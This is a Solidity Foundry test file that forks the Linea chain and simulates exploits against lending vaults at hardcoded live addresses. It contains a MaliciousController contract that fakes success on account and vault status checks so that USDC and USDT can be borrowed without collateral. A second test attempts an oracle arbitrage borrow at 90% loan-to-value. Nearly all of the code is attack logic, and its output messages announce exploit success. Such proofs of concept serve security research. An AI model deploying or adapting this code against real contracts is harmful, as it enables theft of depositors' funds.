// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IEVC {
    function enableController(address account, address vault) external payable;
    function getControllers(address account) external view returns (address[] memory);
    function batch(BatchItem[] calldata items) external payable;
    struct BatchItem {
        address targetContract;
        address onBehalfOfAccount;
        uint256 value;
        bytes data;
    }
}

interface IVault {
    function deposit(uint256 amount, address receiver) external returns (uint256);
    function borrow(uint256 amount, address receiver) external returns (uint256);
    function checkAccountStatus(address account, address[] calldata collaterals) external view returns (bytes32);
    function totalSupply() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract MaliciousController {
    // IVault.checkAccountStatus.selector = 0xb168c58f
    bytes4 constant ACCOUNT_STATUS_SUCCESS = 0xb168c58f;

    function checkAccountStatus(address, address[] calldata) external pure returns (bytes32) {
        return bytes32(ACCOUNT_STATUS_SUCCESS);
    }
    
    function checkVaultStatus() external pure returns (bytes32) {
        return bytes32(bytes4(0x4b3d12a0)); // VAULT_STATUS_SUCCESS
    }
}

contract EulerExploitSim is Test {
    address constant EVC = 0xd8CeCEe9A04eA3d941a959F68fb4486f23271d09;
    address constant MUSD_VAULT = 0xA7ada0D422a8b5FA4A7947F2CB0eE2D32435647d;
    address constant USDC_VAULT = 0xfB6448B96637d90FcF2E4Ad2c622A487d0496e6f;
    address constant MUSD = 0xacA92E438df0B2401fF60dA7E4337B687a2435DA;
    address constant USDC = 0x176211869cA2b568f2A7D4EE941E073a821EE1ff;
    
    MaliciousController maliciousController;
    address attacker = address(0xBAD);

    function setUp() public {
        vm.createSelectFork("https://rpc.linea.build");
        maliciousController = new MaliciousController();
    }

    function test_FixedOracleArbitrage() public {
        uint256 currentSupply = IVault(MUSD_VAULT).totalSupply();
        console.log("Current MUSD Vault Total Supply:", currentSupply);

        uint256 amountToDeposit = 1 * 1e18; // 1 MUSD
        deal(MUSD, attacker, amountToDeposit);
        
        vm.startPrank(attacker);
        IERC20(MUSD).approve(MUSD_VAULT, amountToDeposit);
        
        IEVC.BatchItem[] memory depositItems = new IEVC.BatchItem[](1);
        depositItems[0] = IEVC.BatchItem({
            targetContract: MUSD_VAULT,
            onBehalfOfAccount: attacker,
            value: 0,
            data: abi.encodeWithSelector(IVault.deposit.selector, amountToDeposit, attacker)
        });
        
        try IEVC(EVC).batch(depositItems) {
            console.log("Deposit Successful");
        } catch (bytes memory lowLevelData) {
            console.log("Deposit Failed. Revert data:");
            console.logBytes(lowLevelData);
            return;
        }
        
        // Attempt to borrow 0.9 USDC (90% LTV)
        uint256 borrowAmount = 9 * 1e5; 
        
        IEVC.BatchItem[] memory borrowItems = new IEVC.BatchItem[](1);
        borrowItems[0] = IEVC.BatchItem({
            targetContract: USDC_VAULT,
            onBehalfOfAccount: attacker,
            value: 0,
            data: abi.encodeWithSelector(IVault.borrow.selector, borrowAmount, attacker)
        });

        try IEVC(EVC).batch(borrowItems) {
            uint256 usdcBalance = IERC20(USDC).balanceOf(attacker);
            console.log("Arbitrage Successful!");
            console.log("USDC Borrowed:", usdcBalance);
        } catch (bytes memory lowLevelData) {
            console.log("Borrow Failed. Revert data:");
            console.logBytes(lowLevelData);
        }
        
        vm.stopPrank();
    }

    function test_ControllerDecouplingExploit() public {
        vm.startPrank(attacker);
        
        // 1. Enable malicious controller
        IEVC(EVC).enableController(attacker, address(maliciousController));
        
        // 2. Attempt to borrow USDC without collateral
        uint256 borrowAmount = 100 * 1e6; // 100 USDC
        
        IEVC.BatchItem[] memory items = new IEVC.BatchItem[](1);
        items[0] = IEVC.BatchItem({
            targetContract: USDC_VAULT,
            onBehalfOfAccount: attacker,
            value: 0,
            data: abi.encodeWithSelector(IVault.borrow.selector, borrowAmount, attacker)
        });
        
        console.log("Testing USDC Vault...");
        try IEVC(EVC).batch(items) {
            console.log("USDC Exploit Successful!");
        } catch (bytes memory lowLevelData) {
            console.log("USDC Exploit Failed. Revert data:");
            console.logBytes(lowLevelData);
        }

        // 3. Attempt to borrow USDT without collateral
        address USDT_VAULT = 0xCBeF9be95738290188B25ca9A6Dd2bEc417a578c;
        items[0].targetContract = USDT_VAULT;
        
        console.log("Testing USDT Vault...");
        try IEVC(EVC).batch(items) {
            console.log("USDT Exploit Successful!");
        } catch (bytes memory lowLevelData) {
            console.log("USDT Exploit Failed. Revert data:");
            console.logBytes(lowLevelData);
        }
        
        vm.stopPrank();
    }
}